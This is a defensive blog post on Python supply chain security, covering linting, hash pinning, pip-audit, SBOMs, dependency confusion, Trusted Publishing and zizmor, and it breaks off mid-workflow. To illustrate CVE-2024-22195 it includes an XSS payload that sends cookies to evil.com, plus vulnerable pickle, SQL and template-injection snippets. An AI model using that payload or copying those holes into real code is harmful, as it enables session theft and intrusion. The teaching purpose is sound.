+++
author = "Bernat Gabor"
date = 2026-03-10T00:00:00Z
description = "A comprehensive guide to securing your Python dependencies from ingestion to deployment, covering linting, pinning, vulnerability scanning, SBOMs, and attestations"
draft = false
image = "splash.webp"
images = [ "splash.webp"]
slug = "securing-python-supply-chain"
tags = [ "python", "security", "dependencies", "supply-chain", "sbom", "pypi", "pip"]
title = "Defense in Depth: A Practical Guide to Python Supply Chain Security"
+++

> [!TLDR] **TLDR:**
>
> Layer your defenses and don't trust any single control. Use Ruff with security rules to catch bugs in your code before
> they ship. Pin all your dependencies with cryptographic hashes using `uv lock` or `uv pip compile --generate-hashes`
> so nobody can swap out packages on you. Run [`pip-audit`](https://github.com/pypa/pip-audit) in CI to catch known CVEs
> before they hit production. Generate SBOMs with CycloneDX so when the next Ultralytics-style compromise drops, you can
> answer "are we affected?" in minutes instead of days.
>
> If you're publishing packages, ditch the long-lived API tokens and switch to Trusted Publishing with OIDC. This
> generates attestations automatically via Sigstore, linking your packages back to source repos. Organizations running
> internal mirrors can add a 7-day delay to let the community be your canary - but only if you've got the infrastructure
> to maintain it.
>
> Nothing here is perfect. Hash pinning stops tampering but won't save you from a malicious package you installed on day
> one. Scanning finds known CVEs but misses zero-days. Attestations prove where code came from, not whether it's safe.
> That's why you layer them - when one control fails, the others catch it. Start with linting and pinning for quick
> wins, add scanning and SBOMs next, then level up to advanced stuff as you mature.

I maintain several PyPA projects (virtualenv, tox, pipx, platformdirs, filelock) and work on corporate package hosting
infrastructure. I've watched supply chain attacks targeting Python packages get nastier over the years from both sides:
publishing to PyPI as an open-source maintainer and managing thousands of dependencies as an enterprise consumer. This
post covers practical approaches to securing your Python supply chain. For a broader threat model across all ecosystems,
the
[CNCF Software Supply Chain Security Whitepaper](https://tag-security.cncf.io/community/working-groups/supply-chain-security/supply-chain-security-paper-v2/Software_Supply_Chain_Practices_whitepaper_v2.pdf)
is an excellent primer. Here we'll focus on Python-specific defenses — writing secure code, managing dependencies,
scanning for vulnerabilities, and verifying package authenticity.

## Why This Matters

Here's the scale we're dealing with: PyPI hosts over 743,000 packages as of March 2026, and that number grows daily.
Your average Python project typically pulls in dozens of transitive dependencies - packages you never explicitly chose
but depend on anyway because your dependencies need them. And here's the kicker: security patches consistently lag
behind vulnerability discovery, sometimes by weeks or months.

The flow from developers to your application:

```mermaid
flowchart TB
    Dev[Developer Writes Code] --> Build[Build Package]
    Build --> Upload[Upload to PyPI]
    Upload --> PyPI[PyPI]
    PyPI --> Install[Your pip install]
    Install --> App[Your Application]

    Attacker[Attacker] -.->|Compromise| Dev
    Attacker -.->|Malicious Package| PyPI
    Attacker -.->|Typosquatting| PyPI

    style Attacker fill:#dc2626,stroke:#b91c1c,color:#fff
    style App fill:#50b432,stroke:#3d8a26,color:#fff
    linkStyle 5 stroke:#dc2626
    linkStyle 6 stroke:#dc2626
    linkStyle 7 stroke:#dc2626
```

Notice all those red arrows? Each represents a potential attack vector. Real incidents demonstrate why this matters.

### Real Attacks, Real Impact

**[ctx and PHPass Account Takeover](https://www.crowdstrike.com/en-us/blog/how-crowdstrike-detects-poisoned-python-packages-ctx-phpass/)
(May 2022)**: Attackers compromised the `ctx` package (which hadn't been updated since 2014) by re-registering its
maintainer's expired email domain. They pushed a malicious update that exfiltrated AWS credentials and other sensitive
environment variables to an attacker-controlled server. The report notes roughly 2,000 downloads daily for about 10 days
before detection, potentially exposing many AWS accounts. PyPI has since implemented
[domain resurrection prevention](https://blog.pypi.org/posts/2025-08-18-preventing-domain-resurrections/) - detecting
expired domains and un-verifying associated email addresses to mitigate this attack vector.

**[Ultralytics Compromise](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/) (December 2024)**: The
widely-used YOLO computer vision package (reported ~80 million downloads per month as of December 2024) got compromised
through a GitHub Actions script injection attack. Attackers stole the PyPI upload token and injected a cryptocurrency
miner into four versions. Thousands of developers unknowingly installed malware just by running
`pip install ultralytics`.

**[PyPI Phishing Campaign](https://blog.pypi.org/posts/2025-07-28-pypi-phishing-attack/) (July 2025)**: Maintainers who
published packages with email in metadata were targeted with phishing emails from `noreply@pypj.org` (note the lowercase
`j`). The attack used a proxy credential harvester that passed stolen credentials to the real PyPI, making victims
believe they logged in normally. PyPI responded with
[login verification for TOTP-based logins](https://blog.pypi.org/posts/2025-11-14-login-verification/) from unrecognized
devices.

**[GhostAction Attack](https://blog.pypi.org/posts/2025-09-16-github-actions-token-exfiltration/) (September 2025)**:
Threat actors injected code into GitHub Actions workflows across 570+ repositories, stealing 3,300+ secrets including
PyPI tokens, npm tokens, and AWS access keys. PyPI
[invalidated all stolen tokens](https://www.bleepingcomputer.com/news/security/pypi-invalidates-tokens-stolen-in-ghostaction-supply-chain-attack/)
and pushed everyone to migrate to [Trusted Publishers](#the-new-way-trusted-publishing).

**[Shai-Hulud Worm Campaign](https://blog.pypi.org/posts/2025-11-26-pypi-and-shai-hulud/) (November 2025)**: A
cross-ecosystem worm primarily targeting npm that also hit PyPI because monorepo setups store credentials for both
registries. Attackers compromised npm accounts and exfiltrated long-lived PyPI tokens from GitHub repository secrets.
PyPI proactively revoked exposed tokens and recommended using [zizmor](https://docs.zizmor.sh/) for auditing GitHub
Actions workflows.

These aren't theoretical attacks. They happened to real projects with millions of users. If you discover a malicious
package on PyPI, you can report it through [PyPI's security reporting system](https://pypi.org/security/).

### The Hidden Dependency Problem

When you install Flask, you're not just getting Flask. Here's the full dependency tree:

```bash
# Install Flask
uv pip install flask

# Show the full dependency tree
uv pip tree

# Output:
flask v3.1.0
├── blinker v1.9.0
├── click v8.1.8
├── itsdangerous v2.2.0
├── jinja2 v3.1.5
│   └── markupsafe v3.0.2
└── werkzeug v3.1.3
    └── markupsafe v3.0.2
```

See what happened? You asked for one package (Flask), but you got seven. Look at MarkupSafe at the bottom - it's a
transitive dependency pulled in by both Jinja2 and Werkzeug. You never explicitly installed it. You probably don't even
know what it does. But if it has a vulnerability, your application is vulnerable.

With 50+ transitive dependencies per project on average, your attack surface is massive compared to what appears in your
requirements file.

Now let's build your defense strategy, starting with your own code.

## Secure Your Own Code First

Supply chain attacks don't just come from external dependencies — your own code can create the entry points. A hardcoded
PyPI token in your source code, once pushed to a repository, gives an attacker everything they need to compromise your
account and publish malicious packages under your name. Beyond secrets, common security bugs hide in everyday code
patterns that look perfectly fine during code review — and humans miss these under time pressure. Catching them
automatically with a linter is the first layer of defense.

### The Forever Secret

A leaked credential is the starting point for many supply chain compromises. An exposed PyPI token lets an attacker
publish backdoored versions of your packages. An exposed database URL lets them exfiltrate data. Yet this pattern is
depressingly common:

```python
# Bad: secrets in code live forever in git history
SECRET_KEY = "hunter2"
DATABASE_URL = "postgres://admin:password123@prod-db:5432/app"

# Good: use environment variables
import os

SECRET_KEY = os.environ["SECRET_KEY"]
DATABASE_URL = os.environ["DATABASE_URL"]
```

Git never forgets. When you commit a secret, it lives in your repository's history forever. Deleting it in a later
commit doesn't help — anyone with repository access (or an old clone) can extract those credentials. Attackers routinely
trawl git histories for secrets, and a leaked PyPI token or cloud credential is often the first step in a supply chain
compromise.

### Broken Cryptography

Another common vulnerability:

```python
# Bad: MD5 and SHA1 are broken
import hashlib

digest = hashlib.md5(payload).hexdigest()

# Good: use SHA256 or better
digest = hashlib.sha256(payload).hexdigest()
```

MD5 collisions were first demonstrated in 2004, though weaknesses were known earlier. SHA1 practical collisions were
demonstrated in 2017. Both were deprecated by NIST for digital signatures in 2011. "Broken" means attackers can generate
collisions - different inputs producing the same hash. This enables certificate forgery, download tampering, or
integrity check bypasses. Don't use either for security purposes.

### The Hanging Connection

This one is subtle but dangerous:

```python
# Bad: hangs indefinitely on slow/malicious servers
import requests

response = requests.get("https://api.example.com/data")

# Good: always set timeouts
response = requests.get("https://api.example.com/data", timeout=30)
```

Without a timeout, a slow or malicious server can hang your process indefinitely. An attacker controlling a server your
application talks to can make every request hang, exhausting your thread pool and causing a denial-of-service. Your
whole application grinds to a halt because you forgot one parameter.

### Catch These With Ruff

[Ruff](https://docs.astral.sh/ruff/) is a blazingly fast Python linter that includes comprehensive security rules from
[Bandit](https://bandit.readthedocs.io/en/latest/). You can learn more in the
[Ruff security rules documentation](https://docs.astral.sh/ruff/rules/#flake8-bandit-s). Configure it in
`pyproject.toml`:

```toml
# Start with errors, pyflakes, and security rules
[tool.ruff]
line-length = 120
lint.select = ["E", "F", "S"]
```

The security rules (`["S"]`) alone provide significant value — they're the Bandit checks that catch hardcoded secrets,
weak crypto, and unsafe deserialization. Once your codebase is clean, expand to all rules:

```toml
# Aspirational: enable everything and selectively ignore
[tool.ruff]
line-length = 120
lint.select = ["ALL"]
lint.ignore = [
  "COM812", # conflicts with formatter
  "CPY",    # no copyright
  "D",      # pydocstyle: enable later for public APIs if publishing a library
  "ISC001", # conflicts with formatter
]
```

Ruff runs in under a second, so you can run it as you type in your IDE and before every commit. All three
vulnerabilities above get caught automatically:

- [**S105**](https://docs.astral.sh/ruff/rules/hardcoded-password-string/) - hardcoded secrets,
- [**S324**](https://docs.astral.sh/ruff/rules/hashlib-insecure-hash-function/) - weak cryptography,
- [**S113**](https://docs.astral.sh/ruff/rules/request-without-timeout/) - missing timeouts,
- [**S301**](https://docs.astral.sh/ruff/rules/suspicious-pickle-usage/) - pickle and other unsafe deserialization,
- [**S608**](https://docs.astral.sh/ruff/rules/hardcoded-sql-expression/) - SQL injection via string formatting,
- [**S307**](https://docs.astral.sh/ruff/rules/suspicious-eval-usage/) - using eval() with untrusted input.

Each linked rule page includes a detailed explanation of why the pattern is dangerous, examples of vulnerable code, and
how to fix it - worth reading if you want to understand the risks beyond just silencing the warning. For example, this
dangerous pattern gets flagged immediately:

```python
# FLAGGED: S301 - pickle.loads() can execute arbitrary code
import pickle

data = pickle.loads(untrusted_input)  # Use json.loads() instead

# FLAGGED: S608 - SQL injection vulnerability
cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")
```

Add Ruff to your editor and CI pipeline - it'll save your forgetful self.

## Manage Your Dependencies

Now let's talk about managing the code you didn't write — your dependencies. This is where supply chain attacks actually
happen. The [OpenSSF Secure Supply Chain Consumption Framework (S2C2F)](https://github.com/ossf/s2c2f) provides a
structured maturity model for how organizations should consume open source software.

### Choose Dependencies Carefully

Before adding a dependency, consider whether you need it at all. Every dependency expands your attack surface — fewer
dependencies means fewer opportunities for compromise. When you do add one, evaluate the publisher's security posture
using the [OpenSSF Scorecard](https://securityscorecards.dev/), which grades projects on practices like branch
protection, signed releases, dependency update tooling, and vulnerability disclosure. A low score doesn't mean "don't
use it," but it tells you how much trust you're placing in a project with limited security hygiene.

### The Unpinned Dependency Problem

A scenario that happens more often than you'd think: You write `flask>=2.0` in your requirements file. Today, when you
run `pip install`, you get Flask 3.1.0 and everything works great. Tomorrow, an attacker publishes a compromised Flask
3.1.1. Your next `pip install` silently downloads the malicious version because it satisfies your `>=2.0` constraint.
You just installed malware without changing a single line of code.

The progression from unsafe to secure:

```mermaid
graph LR
    A[Unpinned:<br/>flask>=2.0] -->|Gets any version| B[Risky]
    C[Version Pinned:<br/>flask==3.1.1] -->|Gets exact version| D[Better]
    E[Hash Pinned:<br/>flask==3.1.1<br/>--hash=sha256:...] -->|Verifies content| F[Secure]

    style B fill:#dc2626,stroke:#b91c1c,color:#fff
    style D fill:#f59e0b,stroke:#d97706,color:#fff
    style F fill:#50b432,stroke:#3d8a26,color:#fff
```

**Unpinned** (`flask>=2.0`) is the most dangerous - you get whatever version is latest, which could be compromised. Your
builds aren't reproducible and you have no way to detect tampering.

**Version pinned** (`flask==3.1.1`) is better - you get the exact version you tested with. But there's no integrity
check. If an attacker compromises the maintainer's account and publishes a new backdoored artifact for the same version
(e.g., a wheel targeting a platform that wasn't previously uploaded), you'd install it without knowing.

```mermaid
sequenceDiagram
    participant D as Developer
    participant P as PyPI
    participant A as Attacker

    D->>P: pip install flask==3.1.1
    P-->>D: flask-3.1.1.tar.gz (genuine)
    Note over D: ✅ Works fine, tests pass

    A->>P: Compromises maintainer account
    A->>P: Uploads new flask 3.1.1 wheel (with backdoor)

    D->>P: pip install flask==3.1.1 (different platform)
    P-->>D: flask-3.1.1-cp312-linux.whl (backdoored)
    Note over D: ❌ Same version, different content
```

With hash pinning, the second install would fail because the file's hash no longer matches what was recorded. **Hash
pinned** (`flask==3.1.1 --hash=sha256:d667207822...`) is secure - it creates a cryptographic fingerprint of the package
file. During installation, pip recalculates the hash and compares it to what you specified. If they don't match,
installation fails immediately. Note that PyPI does not allow re-uploading an existing filename — once
`flask-3.1.1.tar.gz` is uploaded, that specific file is immutable. However, an attacker could still upload additional
distribution files for the same version.

What does hash pinning protect against? It ensures you only install the exact artifact you locked, and it detects
tampering in transit, in caches, or in mirrors.

What doesn't it protect against? If you install a package for the first time that's already malicious (like in the
Ultralytics incident), hash pinning won't help - you'll just pin the malicious hash. This is why you combine hash
pinning with vulnerability scanning and delayed ingestion. There are also deeper attacks at the archive format level -
PyPI has had to introduce
[restrictions against ZIP parser confusion attacks](https://blog.pypi.org/posts/2025-08-07-wheel-archive-confusion-attacks/)
where different installers could extract different content from the same wheel file.

### Modern Tooling: uv

[uv](https://docs.astral.sh/uv/) makes hash pinning effortless by generating lockfiles with cryptographic hashes by
default. It also creates isolated virtual environments automatically, limiting the blast radius if a dependency turns
out to be malicious — a compromised package can't affect other projects or system-level resources. See the
[uv lockfile documentation](https://docs.astral.sh/uv/concepts/projects/#lockfile) for details:

```bash
uv lock
uv sync
```

For requirements files with hashes (see [uv pip compile docs](https://docs.astral.sh/uv/reference/cli/#uv-pip-compile)):

```bash
# From a requirements.in file:
uv pip compile --generate-hashes requirements.in -o requirements.txt
# Or from a uv project (hashes included by default):
uv export --format requirements-txt -o requirements.txt
```

If you're not ready to switch to uv yet, [pip-tools](https://github.com/jazzband/pip-tools) provides similar
functionality:

```bash
pip-compile --generate-hashes requirements.in > requirements.txt
```

These commands create SHA256 checksums that get verified at install time. If someone modifies a package even with the
same version number, the hash won't match and installation fails. Read more about
[secure installs with pip](https://pip.pypa.io/en/stable/topics/secure-installs/).

> [!IMPORTANT]
> pip only enforces hash checking when every requirement in the file has a hash, or when you pass `--require-hashes`
> explicitly. A single unhashed line silently disables verification for that package. Tools like
> `uv pip compile --generate-hashes` avoid this by always generating hashes for every dependency.

Hash-pinned lockfiles are a significant step toward **reproducible builds** — given the same lockfile, every install
pulls the same artifacts. Full reproducibility also depends on deterministic build scripts and environments, but pinning
the dependency layer removes one of the biggest sources of variation. `uv lock` captures exact versions, hashes, and
platform markers, getting you most of the way there.

Looking ahead, [PEP 751](https://peps.python.org/pep-0751/) defines `pylock.toml` — a standardized, tool-agnostic lock
file format. Unlike tool-specific formats (`uv.lock`, `poetry.lock`), any tool can produce or consume it. Notably,
`pylock.toml` supports recording
[attestation identities](https://packaging.python.org/en/latest/specifications/index-hosted-attestations/) directly in
the lock file, so consumers can verify package provenance at install time. uv already supports both
[installing from](https://docs.astral.sh/uv/reference/cli/#uv-pip-install) and
[exporting to](https://docs.astral.sh/uv/reference/cli/#uv-export) `pylock.toml`.

### Separate Development From Deployment

> [!WARNING]
> If you're publishing a **library** to PyPI, don't pin dependencies in your `pyproject.toml`. Use broad version ranges
> to avoid conflicts when users install your library alongside others. The advice in this section is for application
> deployment only.

Modern best practice for applications separates what you want (development) from what you got (deployment):

```toml
# pyproject.toml - flexible ranges for development
[project]
dependencies = [
  "flask>=2.0",
  "requests>=2.28",
]
```

```text
# requirements.txt - exact pins for deployment (autogenerated)
flask==3.1.1 \
    --hash=sha256:d667207822...
requests==2.32.3 \
    --hash=sha256:70761cfe03...
werkzeug==3.1.3 \
    --hash=sha256:54b78bf3716...
```

This approach gives you flexibility during development (you can easily upgrade to test new versions) while guaranteeing
exact reproducibility for deployment (production always gets exactly what you tested).
[Dependabot](https://docs.github.com/en/code-security/how-tos/secure-your-supply-chain) can automate updates by filing
pull requests when new versions are available. Add a `.github/dependabot.yml` to your repository:

```yaml
version: 2
updates:
  - package-ecosystem: pip
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 10
```

Dependabot will check your `requirements.txt` (or `pyproject.toml`) weekly and open PRs for outdated or vulnerable
dependencies. Each PR includes the changelog and compatibility score, so you can review before merging.

> [!NOTE]
> Dependabot's `pip` ecosystem does not understand `uv.lock` files. If you use `uv lock` for dependency management,
> either maintain a `requirements.txt` via `uv export` for Dependabot to scan, or use
> [Renovate](https://docs.renovatebot.com/) which has native uv lockfile support.

## Scan For Vulnerabilities

Dependency pinning prevents unauthorized changes, but what if you've pinned a version that already has a known
vulnerability? New CVEs get discovered regularly in popular packages. A package that worked fine yesterday might have a
critical flaw discovered today.

### The Invisible Bug

Why scanning matters - a real example:

```python
# CVE-2024-22195: jinja2 < 3.1.3 allows attribute injection via xmlattr
from jinja2 import Template

template = Template("<div {{ attrs|xmlattr }}>")
# Attacker controls attrs parameter:
result = template.render(
    attrs={
        "safe": "value",
        "onclick": "fetch('https://evil.com/steal?cookie='+document.cookie)",
    }
)
# Renders: <div safe="value" onclick="fetch(...)">
# The injected onclick executes JavaScript in users' browsers, stealing cookies
```

This is [CVE-2024-22195](https://nvd.nist.gov/vuln/detail/CVE-2024-22195), a real vulnerability from 2024. The bug sits
in the template engine itself, so even code that looks reasonable can be vulnerable when it feeds untrusted input into
the affected paths. An attacker can inject malicious JavaScript that executes in users' browsers, potentially stealing
sessions, credentials, or personal data. The critical insight: **you can't see these vulnerabilities by reading your own
code**. The bug is in a dependency you imported. This is why automated vulnerability scanning is essential.

### Automated Scanning With pip-audit

[pip-audit](https://github.com/pypa/pip-audit) is the modern standard for Python vulnerability scanning. Check out the
[pip-audit documentation](https://pypi.org/project/pip-audit/) for full usage details. The flow:

```mermaid
graph LR
    A[Your Dependencies] --> B[pip-audit]
    B --> C[OSV Database]
    C --> D[PyPA Advisories]
    C --> E[GitHub Advisories]
    C --> F[NVD via OSV]
    B --> G[Vulnerability Report]
    style A fill:#058dc7,stroke:#046a9c,color:#fff
    style B fill:#50b432,stroke:#3d8a26,color:#fff
    style C fill:#f59e0b,stroke:#d97706,color:#fff
    style G fill:#50b432,stroke:#3d8a26,color:#fff
```

Install and run it:

```bash
uvx pip-audit --requirement requirements.txt
uvx pip-audit --format json --requirements requirements.txt > report.json
```

Example output:

```text
Name        Version  ID             Fix Versions
----------  -------  -------------  ------------
flask       2.2.0    GHSA-m2qf-hxjv  >=2.2.5
jinja2      3.1.1    CVE-2024-22195  >=3.1.3
```

By default, pip-audit uses the [OSV](https://osv.dev/) (Open Source Vulnerabilities) database, which aggregates
vulnerability data from multiple sources:

- [PyPA Advisories](https://github.com/pypa/advisory-database) - Python-specific security advisories,
- [GitHub Advisories](https://github.com/advisories) - Security advisories from GitHub repositories,
- [National Vulnerability Database (NVD)](https://nvd.nist.gov/) - US government repository (via OSV aggregation).

The OSV database standardizes and merges data from these sources. Coverage is strong but not exhaustive, so treat
pip-audit as an important signal rather than a complete guarantee. Run it in CI on every commit to catch vulnerabilities
before they reach production - it takes seconds and can save you from deploying a critical security hole.

**Alternative tools**: [Safety](https://github.com/pyupio/safety) is another popular Python vulnerability scanner that
offers automated remediation and malicious package detection, though it uses a freemium model with paid plans for
enterprise features. For a broader walkthrough of scanning strategies including pre-commit hooks and custom severity
policies, see the
[CalmOps dependency security guide](https://calmops.com/programming/python/dependency-security-vulnerability-scanning/).

**Not every CVE affects you.** A vulnerability in a dependency's code path you never call is a false positive.
[VEX](https://www.cisa.gov/resources-tools/resources/minimum-requirements-vulnerability-exploitability-exchange-vex)
(Vulnerability Exploitability eXchange) is an emerging standard where software producers can declare whether a specific
CVE actually affects their shipped product. VEX adoption in the Python ecosystem is still early, but it's worth knowing
about — especially if you're triaging a long list of pip-audit findings and need to prioritize what actually matters.

### Integrate Into CI/CD

Security checks should run automatically on every commit. Adding [pip-audit](https://github.com/pypa/pip-audit) to
common CI systems:

**GitHub Actions:**

```yaml
name: Security Scan
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
      - uses: astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86 # v5.4.2
      - run: uvx pip-audit --requirement requirements.txt
```

**GitLab CI:**

```yaml
security-scan:
  image: ghcr.io/astral-sh/uv:python3.14
  script:
    - uvx pip-audit --requirement requirements.txt
```

**Jenkins:**

```groovy
stage('Security Scan') {
    steps {
        sh 'pip install uv && uvx pip-audit --requirement requirements.txt'
    }
}
```

Add Ruff linting to these pipelines as well to catch security issues in your own code before they get merged.

## Know What You're Running

Let's say a critical vulnerability gets announced in a popular library. Your first question: "Are we using this
anywhere?" Without a Software Bill of Materials (SBOM), answering this requires manually checking every project, every
environment, every deployment. With hundreds of applications and thousands of dependencies, this is practically
impossible.

### What's an SBOM?

An SBOM is like an ingredients label for software. Just as food packaging lists every ingredient, an SBOM lists every
software component in your application - both direct dependencies (packages you explicitly installed) and transitive
dependencies (packages those packages depend on).

```mermaid
graph TD
    A[Your Application] --> B[SBOM Generator]
    B --> C[SBOM Document]
    C --> D[Lists: Flask 3.1.1]
    C --> E[Lists: Requests 2.32.3]
    C --> F[Lists: All Transitive Deps]

    G[New CVE Announced<br/>in Requests 2.31.0] --> H{Search SBOM}
    H --> I{Using Requests?}
    I -->|Yes, 2.31.0| J[Action Required]
    I -->|Yes, but 2.32.3| K[Safe - Already Patched]
    I -->|No| L[Not Affected]

    style G fill:#dc2626,stroke:#b91c1c,color:#fff
    style J fill:#dc2626,stroke:#b91c1c,color:#fff
    style K fill:#50b432,stroke:#3d8a26,color:#fff
    style L fill:#50b432,stroke:#3d8a26,color:#fff
```

SBOMs enable rapid vulnerability response, license compliance tracking, regulatory compliance, and build-time dependency
visibility. You know exactly what dependencies were included when your application was built.

### Generate SBOMs

Two major SBOM standards exist: [CycloneDX](https://cyclonedx.org/) (OWASP) and [SPDX](https://spdx.dev/) (Linux
Foundation). Both are widely supported; CycloneDX is more common in the Python ecosystem. Generate one with
[CycloneDX Python](https://github.com/CycloneDX/cyclonedx-python) (see the
[documentation](https://cyclonedx-bom-tool.readthedocs.io/en/latest/) for advanced usage):

```bash
uv pip install cyclonedx-bom
cyclonedx-py environment --output-file sbom.json
```

**Best practices:** Use lockfiles over requirements.txt for more accurate dependency trees. Include cryptographic hashes
to verify package integrity. Version SBOMs alongside code in source control. Generate SBOMs at build time rather than
install time for reproducibility. The [sbomify Python guide](https://sbomify.com/guides/python/) covers these patterns
in depth, including PEP 770 for embedding SBOMs directly in Python packages.

A CycloneDX SBOM includes package metadata with cryptographic hashes:

```json
{
  "components": [
    {
      "type": "library",
      "name": "flask",
      "version": "3.1.1",
      "purl": "pkg:pypi/flask@3.1.1",
      "hashes": [
        {
          "alg": "SHA-256",
          "content": "d667207822..."
        }
      ]
    }
  ]
}
```

It also links packages to their source repositories:

```json
{
  "externalReferences": [
    {
      "type": "vcs",
      "url": "https://github.com/pallets/flask"
    }
  ]
}
```

Package URLs (pURLs) provide a standardized format for identifying packages across ecosystems: `pkg:pypi/flask@3.1.1`
for Python, `pkg:npm/@babel/core@7.24.0` for npm, etc.

### Prevent Dependency Confusion

Dependency confusion attacks exploit how package managers resolve names when you use both public and private package
indexes. An attacker publishes a malicious package to PyPI with the same name as your internal package, and your build
system accidentally installs the public one instead. Here's how the attack works with pip:

```bash
# Your pip.conf uses --extra-index-url for internal packages
pip install --extra-index-url https://internal.corp.com/pypi mypackage

# pip checks BOTH indexes and picks the highest version
# Attacker publishes mypackage==99.0.0 on PyPI
# pip installs the attacker's version because 99.0.0 > your 1.2.3
```

**uv is secure by default.** Unlike pip, uv uses a [first-match strategy](https://docs.astral.sh/uv/concepts/indexes/) -
it stops at the first index where a package is found and won't search further. This prevents dependency confusion out of
the box. You can also pin packages to specific indexes explicitly:

```toml
# pyproject.toml - pin internal packages to your private index
[[tool.uv.index]]
name = "internal"
url = "https://internal.corp.com/pypi"
explicit = true                        # only use this index for explicitly pinned packages

[tool.uv.sources]
mypackage = { index = "internal" }
```

If you're still using pip, mitigate with these strategies:

```bash
# Use --index-url (single index) instead of --extra-index-url (multiple)
# This assumes your internal index proxies public PyPI (pull-through cache).
# If it only hosts internal packages, configure it as a PyPI proxy first.
pip install --index-url https://internal.corp.com/pypi mypackage

# Or lock down pip.conf to a single internal index
[install]
index-url = https://internal.corp.com/pypi
trusted-host = internal.corp.com
```

SBOMs can help detect potential naming conflicts by providing an inventory to audit, but they're detective controls -
they show you what you installed after the fact.

**Reserve specific project names**: While PyPI doesn't support wildcard namespaces like `yourcompany.*`, you can
manually register specific package names you use internally. This prevents attackers from registering them, though it
requires registering each name individually.

**PyPI organization accounts** let teams manage packages under a shared identity, providing centralized access control
and making it harder for typosquatting attacks to impersonate your project. If you publish packages,
[register your organization](https://blog.pypi.org/posts/2025-11-10-trusted-publishers-coming-to-orgs/) to protect your
namespace.

**Other ecosystems handle this differently**: npm `@yourcompany/` scopes provide true namespace isolation, Maven
`com.yourcompany.*` group IDs are self-managed namespaces, and NuGet `YourCompany.*` prefixes can be reserved.

## Verify Package Authenticity

Account takeover is one of the most effective supply chain attacks - compromise a maintainer's credentials and you can
publish malicious code under a trusted name. The ctx incident (expired domain takeover) and the 2025 phishing campaigns
showed that passwords alone aren't enough, even with TOTP-based 2FA (which can be phished through proxy attacks).

That's why PyPI
[mandated 2FA for all project maintainers](https://blog.pypi.org/posts/2023-05-25-securing-pypi-with-2fa/) by end of
2023\. By 2025, [52% of active users had non-phishable 2FA](https://blog.pypi.org/posts/2025-12-31-pypi-2025-in-review/)
(hardware keys or passkeys). But 2FA only protects the PyPI login flow - it doesn't protect the publishing pipeline.
Long-lived API tokens stored in CI/CD systems remain a major risk. The GhostAction and Shai-Hulud attacks didn't need to
phish any maintainer's password - they stole thousands of API tokens directly from GitHub repository secrets.

### The Old Way (Risky)

```yaml
# Traditional approach: long-lived token
  - uses: pypa/gh-action-pypi-publish@release/v1
    with:
      password: ${{ secrets.PYPI_API_TOKEN }}
    # This token never expires
    # Stolen once = permanent access
```

The problem is obvious when you think about it. This token sits in your CI secrets indefinitely. If an attacker
compromises your repository or your CI system, they get permanent access to publish packages under your name.

### The New Way: Trusted Publishing

[Trusted Publishing](https://docs.pypi.org/trusted-publishers/) eliminates long-lived API tokens using OpenID Connect
(OIDC). The
[official Python Packaging guide](https://packaging.python.org/en/latest/guides/publishing-package-distribution-releases-using-github-actions-ci-cd-workflows/)
provides detailed setup instructions. The authentication flow:

```mermaid
sequenceDiagram
    participant GHA as GitHub Actions
    participant OIDC as OIDC Provider
    participant PyPI

    GHA->>OIDC: 1. Request OIDC token
    OIDC->>GHA: 2. Return short-lived token
    GHA->>PyPI: 3. Exchange OIDC token
    PyPI->>GHA: 4. Return temporary API key
    GHA->>PyPI: 5. Upload package
    Note over GHA,PyPI: Key expires in minutes
```

Configure Trusted Publishing in your workflow (and register the Trusted Publisher in PyPI):

```yaml
permissions:
  contents: read
  id-token: write

jobs:
  publish:
    runs-on: ubuntu-latest
    environment: release
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
      - uses: astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86 # v5.4.2
      - uses:
          pypa/gh-action-pypi-publish@7f25271a4aa483500f742f9492b2ab5648d61011     # v1.12.4
```

The security improvements are substantial. There are no long-lived secrets to steal, and credentials rotate on every
workflow run. The short-lived, scoped tokens reduce the exposure window to minutes instead of forever. You also get
provenance tracking through Sigstore transparency logs.

OIDC alone isn't a silver bullet though. If an attacker can modify your workflow file (via a compromised dependency, a
malicious PR merged without review, or a GitHub Actions supply chain attack like GhostAction), they can trigger a
legitimate OIDC token exchange and publish malicious packages through your trusted pipeline. Protect your workflows by
pinning Actions to commit SHAs instead of tags (as shown above — the `# v4.3.1` comment preserves readability),
configuring a GitHub Actions
[deployment environment](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)
with required reviewers so the publish job needs manual approval before the OIDC token exchange, restricting who can
modify workflow files, and auditing your workflows with tools like [zizmor](https://docs.zizmor.sh/).

### Audit Your Workflows With zizmor

[zizmor](https://docs.zizmor.sh/) is a static analysis tool that finds security issues in GitHub Actions workflows —
template injection, unpinned actions, excessive permissions, credential leaks, and
[30+ other audit rules](https://docs.zizmor.sh/audits/). It's particularly relevant here because the GhostAction attack
exploited exactly the kind of workflow vulnerabilities zizmor detects.

Run it against your repository:

```bash
# Scan all workflows in the current repo
uvx zizmor .

# Scan with a GitHub token for online checks (detects impostor commits, known CVEs in actions)
uvx zizmor --gh-token $(gh auth token) .

# Output as JSON or SARIF for CI integration
uvx zizmor --format=sarif . > results.sarif
```

Example output:

```text
warning[excessive-permissions]: overly broad permissions
  --> .github/workflows/ci.yml:4:1
   |
 4 | permissions: write-all
   | ^^^^^^^^^^^^^^^^^^^^^ this permission is overly broad
   |
   = note: audit confidence → High

error[template-injection]: code injection via template expansion
  --> .github/workflows/comment.yml:15:9
   |
15 |     run: echo "${{ github.event.issue.title }}"
   |          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ attacker-controlled input in run step
```

Add it to your pre-commit hooks to catch issues before they're pushed:

```yaml
# .pre-commit-config.yaml
- repo: https://github.com/zizmorcore/zizmor-pre-commit
  rev: v1.22.0
  hooks:
  - id: zizmor
```

Or run it in CI to audit workflows on every PR. The
[official zizmor action](https://github.com/zizmorcore/zizmor-action) uploads findings to GitHub's Security tab via
SARIF:

```yaml
name: Audit GitHub Actions
on:
  push:
    branches: ["main"]
  pull_request:

permissions: {}

jobs:
